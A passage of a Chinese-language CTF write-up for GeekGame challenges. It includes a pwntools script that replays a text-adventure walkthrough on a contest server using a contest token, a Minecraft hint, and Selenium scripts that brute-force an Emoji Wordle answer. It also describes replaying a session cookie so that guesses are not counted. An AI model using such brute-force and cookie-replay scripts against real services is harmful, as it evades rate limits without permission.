</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recvAndSendAfter</span><span class="p">(</span><span class="n">prompt</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">recv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recv</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob16.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10016</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span> <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s2">&#34;Type &#39;exit&#39; to quit the application.&#34;</span><span class="p">,</span> <span class="s1">&#39;newgame&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;What</span><span class="se">\&#39;</span><span class="s1">s your name?&#39;</span><span class="p">,</span> <span class="s1">&#39;gwdx&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;Is gwdx what you want to be known as? &#39;</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;pickup key&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;pickup trinket&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;usewith key door&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;pickup key&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;usewith key door&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;use trinket&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">recv</span> <span class="o">=</span> <span class="n">recvAndSendAfter</span><span class="p">(</span><span class="s1">&#39;[gwdx]:&#39;</span><span class="p">,</span> <span class="s1">&#39;h&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sanity</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\((.*)%\)&#39;</span><span class="p">,</span> <span class="n">recv</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sanityInt</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sanity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ic</span><span class="p">(</span><span class="n">sanityInt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sanityInt</span> <span class="o">&gt;</span> <span class="mi">110</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">sanityInt</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<br>
<h3 id="7-麦恩库拉夫特">7. 麦恩·库拉夫特</h3>
<h4 id="探索的时光">探索的时光</h4>
<p>参考 <a href="https://mivik.moe/ctf-minecraft/">搭建教程</a>，安装 Paper 服务端和 Minosoft 客户端。启动游戏，跟着火把走就能找到 flag</p>
<blockquote>
<p>Minosoft 的画质不如瑞典原神</p>
</blockquote>
<br>
<h2 id="web">Web</h2>
<h3 id="8-emoji-wordle">8. Emoji Wordle</h3>
<h4 id="level-1">Level 1</h4>
<blockquote>
<p>题目中说 Level 1 的答案是固定的</p>
</blockquote>
<p>用 Selenium 与网页交互。从推荐的答案中获取字符，一共有 128 种字符。</p>
<p>枚举每种字符，多跑几轮就能得到答案。</p>
<details>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://prob14.geekgame.pku.edu.cn/level1&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_or</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">default</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allAnswer</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">emoji</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="n">allAnswer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">guessElement</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">guessExample</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;placeholder&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">emoji</span> <span class="o">=</span> <span class="n">emoji</span> <span class="o">|</span> <span class="nb">set</span><span class="p">(</span><span class="n">guessExample</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">guess</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39; &#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">emoji</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">                <span class="n">guess</span> <span class="o">+=</span> <span class="nb">list</span><span class="p">(</span><span class="n">emoji</span><span class="p">)[</span><span class="mi">64</span> <span class="o">+</span> <span class="n">index</span><span class="p">]</span>    <span class="c1"># 需要更改</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">guess</span> <span class="o">+=</span> <span class="n">guessExample</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">guess</span> <span class="o">+=</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">?guess=</span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">.2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># find all li</span>
</span></span><span class="line"><span class="cl">    <span class="n">liElements</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_elements</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">TAG_NAME</span><span class="p">,</span> <span class="s1">&#39;li&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lastLi</span> <span class="o">=</span> <span class="n">liElements</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 🟩 表示正确</span>
</span></span><span class="line"><span class="cl">    <span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">correct</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">lastLi</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;🟩&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">answer</span> <span class="o">+=</span> <span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">correct</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">answer</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">correct</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">answer</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emojiCount</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">emojiCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">emoji</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<h4 id="level-2">Level 2</h4>
<blockquote>
<p>题目中提示 Level 1 的答案是固定的；Level 2 和 3 的答案是随机生成并存储在会话中的。</p>
</blockquote>
<p>发现用之前的 cookie 发送可以不消耗次数。所以可以先发送一次，然后再发送 128 次，枚举每个字符。</p>
<details open>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://prob14.geekgame.pku.edu.cn/level2&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">get_cookies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
